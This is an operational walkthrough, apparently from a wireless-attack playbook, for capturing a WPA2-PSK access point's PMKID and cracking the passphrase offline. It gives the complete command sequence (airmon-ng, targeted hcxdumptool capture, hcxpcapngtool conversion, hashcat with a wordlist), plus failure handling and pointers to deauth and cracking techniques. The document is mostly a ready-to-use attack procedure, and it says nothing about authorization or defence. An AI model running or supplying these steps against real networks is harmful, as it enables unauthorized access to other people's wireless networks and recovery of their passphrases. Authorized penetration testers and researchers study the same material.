# PMKID capture — walkthrough

The client-free WPA2-PSK attack. One association attempt, one M1, one
hash line. If the AP emits PMKID, you never need to see a real client.

## Preconditions

- Target AP is WPA2-PSK (or the WPA2 side of a WPA3 transition).
- AP firmware has NOT disabled PMKID emission (many still leak).
- Monitor+injection interface on the Pineapple (`wlan1mon`).

## Steps

```
# 1. Start monitor mode and confirm the target is on channel N.
airmon-ng start wlan1
iw dev wlan1mon set channel <N>

# 2. Aggressive PMKID capture — one BSSID at a time is cleanest.
echo "AA:BB:CC:DD:EE:FF" > /root/target.bssidlist
hcxdumptool -i wlan1mon \
  -o /tmp/pmkid.pcapng \
  --enable_status=1 \
  --filterlist_ap=/root/target.bssidlist \
  --filtermode=2

# Wait for a "MP:M1M2 ROGUE" or "FOUND PMKID" line in the status.
# Ctrl-C.

# 3. Convert to hashcat 22000.
hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng
grep '^WPA\*01' /tmp/hs.22000     # confirm at least one PMKID line

# 4. Crack.
hashcat -m 22000 /tmp/hs.22000 /path/to/rockyou.txt -w 4 --status
```

## What `hcxdumptool` is actually doing

- Sends unauthenticated Association Requests toward the target BSSID.
- Waits for the AP's M1.
- Reads the RSN IE PMKID field from that M1.
- Logs the pcap; the packet is trivial once decoded.

No client interaction. No deauth. No wait for a natural association.
This is what makes PMKID the fast lane.

## When to reach for this instead of 4-way

Always. If PMKID lands, it lands in seconds. If it doesn't (AP
suppresses), fall back to 4-way targeted deauth (`wpa2/walkthrough.md`
Path B). Don't try both simultaneously — `hcxdumptool` handles both.

## The 22000 line for a PMKID

```
WPA*01*<PMKID>*<AP_MAC>*<STA_MAC>*<ESSID hex>***
```

Note the trailing `***` — the ANonce / EAPOL-frame / MC fields are
empty on a PMKID-only line. Do not manually paste them.

## Cracking cost

PMKID and 4-way handshake share the *same* underlying operation
(PBKDF2-HMAC-SHA1 over the passphrase and ESSID → PMK; HMAC-SHA1
of the PMK for the PMKID). Per-guess GPU cost is identical. Don't
prefer 4-way "for a stronger crack" — the crack cost is the same,
PMKID just avoids capture-time waiting.

## Failure modes

- **`hcxpcapngtool` reports 0 hashes.** AP did not emit PMKID.
  Fall back to 4-way.
- **Hashcat says "no hashes loaded".** The 22000 line malformed
  (usually a missing ESSID hex or a stray `\r\n`). Re-run
  `hcxpcapngtool --info /tmp/pmkid.pcapng` to see what was parsed.
- **Cracks to nothing on rockyou.txt.** Move to
  `cracking-tradecraft/` (masks, rules, SSID-derived wordlists).
- **WPA3-SAE-only target.** PMKID does not apply. Move to
  `wpa3/walkthrough.md`.

## Cite

- Steube 2018 — hashcat forum thread 7717.
- hcxtools GitHub — hcxdumptool README.
- hashcat wiki — mode 22000 example hashes.
- attacks.json: `pmkid-capture`.
